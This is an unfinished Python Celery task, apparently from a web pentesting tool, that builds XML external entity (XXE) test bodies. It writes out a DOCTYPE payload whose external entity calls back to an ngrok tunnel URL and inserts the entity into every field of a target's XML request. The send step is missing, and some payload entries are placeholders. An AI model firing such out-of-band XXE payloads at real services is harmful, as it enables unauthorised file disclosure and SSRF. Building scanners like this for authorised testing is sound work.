from celery import shared_task
from pentest.helpers.utils import RequestWrapper, finishTest
from collections import OrderedDict
import xmltodict
import dicttoxml
import json
import re
import requests

def payload_inserter (d, payload):
    for k, v in d.items():
        if isinstance (v, OrderedDict):
            payload_inserter(v, payload)
        else:
            d[k] = payload
    return d



@shared_task
def XXETest(url, test_id, request_method, headers, data_format, body):

    r = requests.get("http://127.0.0.1:4040/api/tunnels")
    resp = r.json()
    ngrok_url = resp["tunnels"][0]["public_url"]
   

    body = xmltodict.parse(body)

    payloads = {
        f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "{ngrok_url}">] >': "&xxe;",
        'ssrf utf7': "&xxe;",
        'asdasd': "asd",
        'qwe': "qwe",
    }

    for (header, payload) in payloads.items():
        current_body = body
        payload_inserter(current_body, payload)
        current_body = dicttoxml.dicttoxml(current_body)
        current_body = re.sub("&amp;", "&", current_body.decode())

        current_body = header + current_body
        print("sending req body")
        print(current_body)




#test_id = 5
#payload_id = 100
#payload_string = "XXE Unsuccessful"
#masuk /5/100, diganti jadi successfull. Sleep(20)
#Masih unsuccessful

#insert payload_id, dapetin payload_id terakhir